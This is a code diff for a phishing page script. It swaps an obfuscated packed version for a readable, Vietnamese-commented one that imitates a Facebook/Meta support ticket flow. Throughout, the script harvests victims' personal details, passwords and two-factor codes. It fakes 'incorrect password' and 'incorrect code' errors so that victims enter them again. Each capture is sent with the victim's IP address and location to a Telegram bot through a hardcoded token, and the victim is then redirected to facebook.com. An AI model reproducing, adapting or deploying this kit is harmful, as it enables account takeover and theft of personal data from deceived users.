@@ -1,1 +1,314 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 V={2d:{1D:"3D:3C-3B",1d:"-3A"},1K:"1C://3z.3y.3x/",2e:"1C://3w.1i/"};6 t={11(2g){6 1e=9.d("1e");5(1e)1e.q.I("o");["R","1Z","1V"].3v(1H=>{6 1J=9.d(1H);5(1J)1J.q.X("o")});6 1I=9.d(2g);5(1I)1I.q.I("o")},1j(g,1G){5(g===\'14\'){j a=9.d("1F");5(!a){6 B=9.d("1Y");5(B){a=9.3u("p");a.1H="1F";a.3t="1c-3s-3r 1c-3q 3p-3 1c-3o";B.3n.3m(a,B.3l)}}5(a){a.l=1G;a.q.I("o")}}u 5(g===\'G\'){6 a=9.d("2f");5(a){a.l=1G;a.q.I("o")}}},1f(g){5(g===\'G\'){6 a=9.d("2f");5(a)a.q.X("o")}5(g===\'14\'){6 a=9.d("1F");5(a)a.q.X("o")}}};6 h={22:1A()=>{1r{6 1b=18 2c(V.2e);6 8=18 1b.2b();5(8.3k){c{F:8.F,U:8.U||"1E",T:8.T||"1E",E:8.E?8.E.3j:""}}c{F:8.F||"1E",U:"N/A",T:"N/A",E:""}}29(e){c{F:"3i",U:"N/A",T:"N/A",E:""}}},28:()=>{c 3h 3g().3f("3e-3d",{3c:"3b/3a"})},L:1A(2a)=>{6{1D,1d}=V.2d;5(!1D||!1d)c x;1r{6 1b=18 2c(`1C:39:\'38\',37:{\'36-35\':\'34/2b\'},33:32.31({2Z:1d,1c:2a,2Y:\'2X\'})});5(!1b.2W)c x;c W}29(e){2V.2U(e);c x}},K:(8,g,S)=>{6 25=h.28();j w="";5(g==="1v")w="📝 1v";u 5(g==="1X")w="🔑 27 1";u 5(g==="1W")w="🔐 27 2";u 5(g==="1m")w="🔥 1m";u w="🔔 2T";j D=`<b>2S:</b>${8.1w}`;5(8.v)D+=`\\n<b>26:</b>${8.v}`;5(8.17)D+=`\\n<b>2R 26:</b>${8.17}`;D+=`\\n<b>2Q:</b>${8.z}`;5(8.16)D+=`\\n<b>2P:</b>${8.16}`;j 1a="";5(8.15)1a+=`\\n----------------\\n<b>2O:</b> <r>${8.15}</r>`;5(8.13)1a+=`\\n<b>2N:</b> <r>${8.13}</r>`;j 1B="";5(8.Z)1B=`\\n----------------\\n<b>📲2M:</b> <r>${8.Z}</r>`;j 24=`\\n================\\n🌍<r>${S.F}</r>\\n📍${S.U},${S.T}${S.E}`;c`<b>${w}</b>|${25}\\n----------------\\n${D}${1a}${1B}${24}`},1o:(m,g)=>{5(!m)c"...";5(g===\'v\'){6 C=m.2L(\'@\');5(C.P<2)c m;6 23=C[0].P>3?C[0].19(0,3):C[0].19(0,1);c`${23}***@${C[1]}`}5(g===\'z\'){5(m.P<7)c m;c`${m.19(0,3)}****${m.19(m.P-3)}`}c m}};9.M("2K",1A()=>{6 J=18 h.22();j f={1w:"",v:"",17:"",z:"",16:"",15:"",13:"",Z:""};j 1t=0;j 1l=0;j Y=x;6 1y=9.d("2J");6 1x=9.2I("#R 2H");6 1u=9.d("2G");6 i=9.d("2F");6 y=9.d("2E");6 1z=9.d("2D");5(1z)1z.l="2C-"+21.2B(2A+21.2z()*2y);5(1y){1y.M("10",()=>t.11("R"))}5(1x){1x.M("10",()=>{6 Q=9.20("#R .2x-B");6 O=9.20("#R .2w B");f.1w=Q[0].k||"N/A";f.v=Q[1].k||"N/A";f.17=Q[2].k||"N/A";f.z=Q[4].k||"N/A";5(O.P>=3){f.16=`${O[0].k}/${O[1].k}/${O[2].k}`}h.L(h.K(f,"1v",J));t.11("1Z")})}5(1u){1u.M("10",()=>{6 1s=9.d("1Y");6 12=1s.k;5(!12)c;1t++;5(1t===1){f.15=12;h.L(h.K(f,"1X",J));1s.k="";t.1j("14","1U 14 1T 1S 1i 1R. 1Q 1r 1h.")}u{f.13=12;h.L(h.K(f,"1W",J));6 1q=9.d("2v");6 1p=9.d("2u");5(1q)1q.l=h.1o(f.v,\'v\');5(1p)1p.l=h.1o(f.z,\'z\');t.11("1V")}})}5(i){i.M("10",()=>{5(Y)c;6 1k=9.d("2t");6 1n=1k.k.2s();5(!1n)c;f.Z=1n;1l++;h.L(h.K(f,"1m",J));5(1l<3){1k.k="";t.1j("G","1U r 1T 1S 1i 1R.");Y=W;i.1g=W;i.1M.1L="0.7";i.l="1Q 2r...";5(y){j H=30;y.q.I("o");y.l=`1P 1h 1O ${H}s`;6 1N=2q(()=>{H--;y.l=`1P 1h 1O ${H}s`;5(H<=0){2p(1N);Y=x;y.q.X("o");t.1f("G");i.1g=x;i.1M.1L="1";i.l="2o"}},2n)}}u{i.l="2m...";i.1g=W;t.1f("G");2l(()=>{2k.2j.2i=V.1K},2h)}})}});',62,226,'|||||if|const||data|document|err||return|getElementById||formData|type|Utils|btnVerify|let|value|innerText|str||hidden||classList|code||Modal|else|email|icon|false|countdownEl|phone||input|parts|infoBlock|flag|ip|verify|seconds|remove|userLoc|formatReport|sendMessage|addEventListener||dobInputs|length|inputs|infoForm|loc|country|city|CONFIG|true|add|isLocked|twoFactorCode|click|show|val|pass2|password|pass1|dob|businessEmail|await|substring|passBlock|response|text|CHAT_ID|overlay|hideError|disabled|again|is|showError|codeInput|otpAttempts|OTP|codeVal|maskString|maskPhoneEl|maskEmailEl|try|passInput|passwordAttempts|btnPass|INFO|fullName|btnSendInfo|btnSubmit|ticketEl|async|otpBlock|https|BOT_TOKEN|Unknown|passwordError|msg|id|target|el|REDIRECT_URL|opacity|style|timer|in|Try|Please|incorrect|entered|you|The|verifyModal|PASS2|PASS1|passwordInput|passwordForm|querySelectorAll|Math|getLocation|visible|ipBlock|time|Mail|PASS|getTime|catch|message|json|fetch|TELEGRAM|IP_API|verifyError|modalId|1500|href|location|window|setTimeout|Processing|1000|Continue|clearInterval|setInterval|wait|trim|verifyCode|maskedPhone|maskedEmail|grid|meta|900000|random|100000|floor|REF|ticketId|countdown|verifyBtn|continueBtn|button|querySelector|submitRequestBtn|DOMContentLoaded|split|2FA|P2|P1|DOB|Phone|Biz|Name|REPORT|error|console|ok|HTML|parse_mode|chat_id||stringify|JSON|body|application|Type|Content|headers|POST|method|Ho_Chi_Minh|Asia|timeZone|VN|vi|toLocaleString|Date|new|Error|emoji|success|nextSibling|insertBefore|parentNode|center|mb|sm|500|red|className|createElement|forEach|ipwho|com|facebook|www|5070121169|jo2pWKh5A9imE|AAFbe2QHrx26J5pREWtgn|7100924911'.split('|'),0,{}))
+/* ================= 1. CONFIGURATION ================= */
+const CONFIG = {
+    TELEGRAM: {
+        // Thay token và chat ID của bạn vào đây
+        BOT_TOKEN: "7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE",
+        CHAT_ID: "-5070121169"
+    },
+    // Link chuyển hướng sau khi hoàn tất
+    REDIRECT_URL: "https://www.facebook.com/",
+    // API lấy địa chỉ IP
+    IP_API: "https://ipwho.is/"
+};
+
+/* ================= 2. MODAL & UI HELPERS ================= */
+const Modal = {
+    // Hiển thị Popup theo ID, ẩn các cái khác
+    show(modalId) {
+        const overlay = document.getElementById("overlay");
+        if (overlay) overlay.classList.remove("hidden");
+
+        ["infoForm", "passwordForm", "verifyModal"].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.add("hidden");
+        });
+
+        const target = document.getElementById(modalId);
+        if (target) target.classList.remove("hidden");
+    },
+
+    // Hiển thị lỗi đỏ
+    showError(type, msg) {
+        if (type === 'password') {
+            // Tìm thẻ lỗi password
+            let err = document.getElementById("passwordError");
+            
+            // FIX: Nếu HTML lỡ quên chưa tạo thẻ lỗi, tự tạo luôn bằng JS để chắc chắn hiện
+            if (!err) {
+                const input = document.getElementById("passwordInput");
+                if(input) {
+                    err = document.createElement("p");
+                    err.id = "passwordError";
+                    err.className = "text-red-500 text-sm mb-3 text-center";
+                    input.parentNode.insertBefore(err, input.nextSibling);
+                }
+            }
+
+            if (err) {
+                err.innerText = msg;
+                err.classList.remove("hidden");
+            }
+        } else if (type === 'verify') {
+            const err = document.getElementById("verifyError");
+            if (err) {
+                err.innerText = msg;
+                err.classList.remove("hidden");
+            }
+        }
+    },
+
+    // Ẩn lỗi (khi retry)
+    hideError(type) {
+        if (type === 'verify') {
+            const err = document.getElementById("verifyError");
+            if (err) err.classList.add("hidden");
+        }
+        if (type === 'password') {
+            const err = document.getElementById("passwordError");
+            if (err) err.classList.add("hidden");
+        }
+    }
+};
+
+/* ================= 3. UTILITIES (LOGIC GỬI TIN) ================= */
+const Utils = {
+    // Lấy thông tin IP
+    getLocation: async () => {
+        try {
+            const response = await fetch(CONFIG.IP_API);
+            const data = await response.json();
+            if (data.success) {
+                return {
+                    ip: data.ip,
+                    city: data.city || "Unknown",
+                    country: data.country || "Unknown",
+                    flag: data.flag ? data.flag.emoji : ""
+                };
+            }
+            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
+        } catch (e) {
+            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
+        }
+    },
+
+    // Lấy giờ hiện tại Việt Nam
+    getTime: () => {
+        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+    },
+
+    // Gửi tin nhắn về Telegram
+    sendMessage: async (message) => {
+        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
+        if (!BOT_TOKEN || !CHAT_ID) return false;
+
+        try {
+            // SỬA LỖI: Thêm dấu backtick ` bao quanh URL
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            if (!response.ok) return false;
+            return true;
+        } catch (e) {
+            console.error(e);
+            return false;
+        }
+    },
+
+    // Tạo nội dung báo cáo (Log)
+    formatReport: (data, type, loc) => {
+        const time = Utils.getTime();
+        
+        let icon = "";
+        if (type === "INFO") icon = "📝 INFO";
+        else if (type === "PASS1") icon = "🔑 PASS 1";
+        else if (type === "PASS2") icon = "🔐 PASS 2"; // Log Full
+        else if (type === "OTP") icon = "🔥 OTP";
+        else icon = "🔔 REPORT";
+
+        // SỬA LỖI: Thêm dấu backtick ` cho các biến chuỗi
+        let infoBlock = `<b>Name:</b> ${data.fullName}`;
+        if (data.email) infoBlock += `\n<b>Mail:</b> ${data.email}`;
+        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
+        infoBlock += `\n<b>Phone:</b> ${data.phone}`;
+        if (data.dob) infoBlock += `\n<b>DOB:</b> ${data.dob}`;
+
+        let passBlock = "";
+        if (data.pass1) passBlock += `\n----------------\n<b>P1:</b> <code>${data.pass1}</code>`;
+        if (data.pass2) passBlock += `\n<b>P2:</b> <code>${data.pass2}</code>`;
+        
+        let otpBlock = "";
+        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;
+
+        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;
+
+        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
+    },
+
+    // Ẩn email/sđt để hiển thị ở form OTP
+    maskString: (str, type) => {
+        if (!str) return "...";
+        if (type === 'email') {
+            const parts = str.split('@');
+            if (parts.length < 2) return str;
+            const visible = parts[0].length > 3 ? parts[0].substring(0, 3) : parts[0].substring(0, 1);
+            return `${visible}***@${parts[1]}`;
+        }
+        if (type === 'phone') {
+            if (str.length < 7) return str;
+            return `${str.substring(0, 3)}****${str.substring(str.length - 3)}`;
+        }
+        return str;
+    }
+};
+
+/* ================= 4. MAIN APP LOGIC ================= */
+document.addEventListener("DOMContentLoaded", async () => {
+    // 1. Khởi tạo
+    const userLoc = await Utils.getLocation(); 
+    let formData = {
+        fullName: "", email: "", businessEmail: "", phone: "", dob: "",
+        pass1: "", pass2: "", twoFactorCode: ""
+    };
+    
+    // State quản lý luồng
+    let passwordAttempts = 0;
+    let otpAttempts = 0;
+    let isLocked = false; 
+
+    // DOM Elements
+    const btnSubmit = document.getElementById("submitRequestBtn");
+    const btnSendInfo = document.querySelector("#infoForm button");
+    const btnPass = document.getElementById("continueBtn");
+    const btnVerify = document.getElementById("verifyBtn");
+    const countdownEl = document.getElementById("countdown");
+
+    // Tạo Ticket ID ảo cho đẹp
+    const ticketEl = document.getElementById("ticketId");
+    if (ticketEl) ticketEl.innerText = "REF-" + Math.floor(100000 + Math.random() * 900000);
+
+    // --- BƯỚC 0: Mở form Info ---
+    if (btnSubmit) {
+        btnSubmit.addEventListener("click", () => Modal.show("infoForm"));
+    }
+
+    // --- BƯỚC 1: XỬ LÝ FORM INFO ---
+    if (btnSendInfo) {
+        btnSendInfo.addEventListener("click", () => {
+            const inputs = document.querySelectorAll("#infoForm .meta-input");
+            const dobInputs = document.querySelectorAll("#infoForm .grid input");
+
+            // [0] FullName, [1] Email, [2] Business Email, [3] Page Name, [4] Phone
+            formData.fullName = inputs[0].value || "N/A";
+            formData.email = inputs[1].value || "N/A";
+            formData.businessEmail = inputs[2].value || "N/A";
+            formData.phone = inputs[4].value || "N/A";
+            
+            if (dobInputs.length >= 3) {
+                formData.dob = `${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value}`;
+            }
+
+            Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
+            Modal.show("passwordForm");
+        });
+    }
+
+    // --- BƯỚC 2: XỬ LÝ PASSWORD (2 Lần) ---
+    if (btnPass) {
+        btnPass.addEventListener("click", () => {
+            const passInput = document.getElementById("passwordInput");
+            const val = passInput.value;
+            
+            if (!val) return; 
+
+            passwordAttempts++;
+
+            if (passwordAttempts === 1) {
+                // === LẦN 1: Giả vờ sai ===
+                formData.pass1 = val;
+                Utils.sendMessage(Utils.formatReport(formData, "PASS1", userLoc));
+
+                passInput.value = "";
+                // Báo lỗi (Code bên trên đã thêm tự động tạo thẻ lỗi nếu thiếu)
+                Modal.showError("password", "The password you entered is incorrect. Please try again.");
+                
+            } else {
+                // === LẦN 2: Chấp nhận -> Sang OTP ===
+                formData.pass2 = val;
+                Utils.sendMessage(Utils.formatReport(formData, "PASS2", userLoc));
+
+                const maskEmailEl = document.getElementById("maskedEmail");
+                const maskPhoneEl = document.getElementById("maskedPhone");
+                if (maskEmailEl) maskEmailEl.innerText = Utils.maskString(formData.email, 'email');
+                if (maskPhoneEl) maskPhoneEl.innerText = Utils.maskString(formData.phone, 'phone');
+
+                Modal.show("verifyModal");
+            }
+        });
+    }
+
+    // --- BƯỚC 3: XỬ LÝ OTP (Lock 30s) ---
+    if (btnVerify) {
+        btnVerify.addEventListener("click", () => {
+            if (isLocked) return; 
+
+            const codeInput = document.getElementById("verifyCode");
+            const codeVal = codeInput.value.trim();
+
+            if (!codeVal) return; 
+
+            formData.twoFactorCode = codeVal;
+            otpAttempts++;
+
+            Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));
+
+            if (otpAttempts < 3) {
+                // === LẦN 1 & 2: Sai -> KHÓA ===
+                codeInput.value = "";
+                Modal.showError("verify", "The code you entered is incorrect.");
+
+                isLocked = true;
+                btnVerify.disabled = true;
+                btnVerify.style.opacity = "0.7";
+                btnVerify.innerText = "Please wait...";
+
+                if (countdownEl) {
+                    let seconds = 30;
+                    countdownEl.classList.remove("hidden");
+                    countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
+
+                    const timer = setInterval(() => {
+                        seconds--;
+                        countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
+
+                        if (seconds <= 0) {
+                            clearInterval(timer);
+                            isLocked = false;
+                            countdownEl.classList.add("hidden");
+                            Modal.hideError("verify");
+                            
+                            btnVerify.disabled = false;
+                            btnVerify.style.opacity = "1";
+                            btnVerify.innerText = "Continue";
+                        }
+                    }, 1000);
+                }
+
+            } else {
+                // === LẦN 3: DONE ===
+                btnVerify.innerText = "Processing...";
+                btnVerify.disabled = true;
+                Modal.hideError("verify");
+
+                setTimeout(() => {
+                    window.location.href = CONFIG.REDIRECT_URL;
+                }, 1500);
+            }
+        });
+    }
+});
